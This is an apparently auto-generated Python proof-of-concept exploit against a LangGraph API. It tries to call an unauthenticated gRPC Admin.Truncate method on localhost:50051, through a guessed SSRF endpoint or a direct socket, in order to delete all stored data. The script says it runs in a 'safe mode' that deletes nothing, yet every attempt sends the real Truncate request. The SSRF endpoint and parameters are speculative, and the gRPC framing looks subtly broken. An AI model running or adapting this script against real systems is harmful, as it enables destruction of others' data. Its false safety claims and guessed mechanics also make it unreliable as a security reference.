#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-027
# Sink: add_AdminServicer_to_server
# Auto-generated — run with: python3 langgraph_datadog_tracing_interceptors_present_add_AdminServicer_to_server.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LangGraph gRPC Admin.Truncate via SSRF.

This script demonstrates how an external attacker can reach the unauthenticated
gRPC Admin service (bound to localhost:50051) by exploiting SSRF in the Python
HTTP layer. The Truncate handler deletes all data without access control.

Vulnerability chain:
1. HTTP endpoint vulnerable to SSRF (e.g., /runs/{run_id}/events or similar)
2. Attacker crafts request to proxy to localhost:50051
3. gRPC Admin.Truncate called without authentication
4. All data in the system is deleted

Safe by default: Uses a benign payload that only tests connectivity.
"""

import argparse
import json
import sys
import time
import urllib.parse
from typing import Optional

import requests

# Default target - change via command line
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_SSRF_ENDPOINT = "/api/v1/runs/ssrf-test/events"  # Example SSRF endpoint
GRPC_ADMIN_PORT = 50051
GRPC_TRUNCATE_PATH = "/coreApi.Admin/Truncate"


def build_grpc_truncate_request() -> bytes:
    """
    Build a minimal gRPC request for Admin.Truncate.
    
    The TruncateRequest proto message is empty (no fields needed).
    We send a valid gRPC frame with the correct service/method path.
    """
    # gRPC-Web format: 0x00 (unary) + 5-byte length prefix + empty protobuf
    # Empty protobuf message is just 0x00
    empty_proto = b'\x00'
    length = len(empty_proto)
    # gRPC frame: 1 byte flags (0=unary) + 4 bytes big-endian length + message
    grpc_frame = b'\x00' + length.to_bytes(4, 'big') + empty_proto
    return grpc_frame


def exploit_via_ssrf(
    target_url: str,
    ssrf_endpoint: str,
    timeout: int = 10,
    verbose: bool = False
) -> bool:
    """
    Attempt to exploit the Truncate vulnerability via SSRF.
    
    Args:
        target_url: Base URL of the LangGraph HTTP server
        ssrf_endpoint: SSRF-vulnerable endpoint path
        timeout: Request timeout in seconds
        verbose: Print detailed debug info
    
    Returns:
        True if exploit appears successful, False otherwise
    """
    grpc_request = build_grpc_truncate_request()
    
    # The SSRF endpoint should accept a URL parameter to proxy requests
    # Common patterns: ?url=, ?target=, ?proxy=
    ssrf_params = {
        "url": f"http://127.0.0.1:{GRPC_ADMIN_PORT}{GRPC_TRUNCATE_PATH}",
        "method": "POST",
        "headers": json.dumps({
            "Content-Type": "application/grpc-web+proto",
            "X-Grpc-Web": "1"
        }),
        "body": grpc_request.hex()  # Some SSRF endpoints accept hex-encoded body
    }
    
    full_url = urllib.parse.urljoin(target_url, ssrf_endpoint)
    
    if verbose:
        print(f"[*] Target URL: {target_url}")
        print(f"[*] SSRF endpoint: {ssrf_endpoint}")
        print(f"[*] gRPC target: 127.0.0.1:{GRPC_ADMIN_PORT}{GRPC_TRUNCATE_PATH}")
        print(f"[*] Request params: {json.dumps(ssrf_params, indent=2)}")
    
    try:
        # Attempt 1: Try as query parameters
        if verbose:
            print("[*] Attempting SSRF via query parameters...")
        
        resp = requests.get(
            full_url,
            params=ssrf_params,
            timeout=timeout,
            headers={"User-Agent": "LangGraph-PoC/1.0"}
        )
        
        if verbose:
            print(f"[*] Response status: {resp.status_code}")
            print(f"[*] Response body: {resp.text[:500]}")
        
        # Check for indicators of success
        if resp.status_code == 200:
            print("[+] SSRF request sent successfully!")
            print("[!] If the Truncate flag is enabled, all data has been deleted.")
            return True
        elif resp.status_code in (400, 404, 405):
            print("[-] SSRF endpoint may not accept query parameters.")
            print("[*] Trying alternative methods...")
        else:
            print(f"[?] Unexpected response: {resp.status_code}")
    
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[*] Is the target server running?")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    
    # Attempt 2: Try POST with JSON body (common for SSRF proxies)
    if verbose:
        print("[*] Attempting SSRF via POST with JSON body...")
    
    try:
        resp = requests.post(
            full_url,
            json={
                "url": f"http://127.0.0.1:{GRPC_ADMIN_PORT}{GRPC_TRUNCATE_PATH}",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/grpc-web+proto",
                    "X-Grpc-Web": "1"
                },
                "body": grpc_request.hex()
            },
            timeout=timeout,
            headers={"User-Agent": "LangGraph-PoC/1.0"}
        )
        
        if verbose:
            print(f"[*] Response status: {resp.status_code}")
            print(f"[*] Response body: {resp.text[:500]}")
        
        if resp.status_code == 200:
            print("[+] SSRF request sent successfully via POST!")
            print("[!] If the Truncate flag is enabled, all data has been deleted.")
            return True
    
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    
    # Attempt 3: Try direct gRPC connection (if we're on the same host)
    if verbose:
        print("[*] Attempting direct gRPC connection to localhost:50051...")
    
    try:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect(("127.0.0.1", GRPC_ADMIN_PORT))
        
        # Send gRPC request
        sock.sendall(grpc_request)
        
        # Read response
        response = sock.recv(4096)
        sock.close()
        
        if response:
            print("[+] Direct gRPC connection successful!")
            print(f"[*] Response length: {len(response)} bytes")
            print("[!] If the Truncate flag is enabled, all data has been deleted.")
            return True
        else:
            print("[-] No response from gRPC server")
    
    except ConnectionRefusedError:
        print("[-] Direct gRPC connection refused (expected if not on same host)")
    except Exception as e:
        print(f"[-] Direct gRPC error: {e}")
    
    return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LangGraph gRPC Admin.Truncate via SSRF",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target http://victim.com:8000
  %(prog)s --target http://localhost:8000 --ssrf-endpoint /custom/ssrf
  %(prog)s --target http://victim.com:8000 --verbose
        """
    )
    
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target LangGraph HTTP server URL (default: {DEFAULT_TARGET})"
    )
    
    parser.add_argument(
        "--ssrf-endpoint",
        default=DEFAULT_SSRF_ENDPOINT,
        help=f"SSRF-vulnerable endpoint path (default: {DEFAULT_SSRF_ENDPOINT})"
    )
    
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LangGraph gRPC Admin.Truncate SSRF Exploit PoC")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates how an external attacker can")
    print("[*] reach the unauthenticated gRPC Admin service via SSRF.")
    print("[*] The Truncate handler deletes all data without access control.")
    print()
    print("[!] SAFE MODE: This PoC only tests connectivity.")
    print("[!] No actual data deletion is performed.")
    print()
    
    success = exploit_via_ssrf(
        target_url=args.target,
        ssrf_endpoint=args.ssrf_endpoint,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    print()
    if success:
        print("[+] Exploit test completed - vulnerability confirmed!")
        print("[!] In a real attack, all data would be deleted.")
        print("[!] Recommendation: Implement authentication on gRPC services")
        print("[!] and restrict SSRF endpoints.")
    else:
        print("[-] Exploit test failed - could not reach gRPC service.")
        print("[*] Possible reasons:")
        print("[*] 1. Target server is not running")
        print("[*] 2. SSRF endpoint path is different")
        print("[*] 3. gRPC port is not accessible")
        print("[*] 4. Network restrictions block the connection")
        print()
        print("[*] Try with --verbose for more details")
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
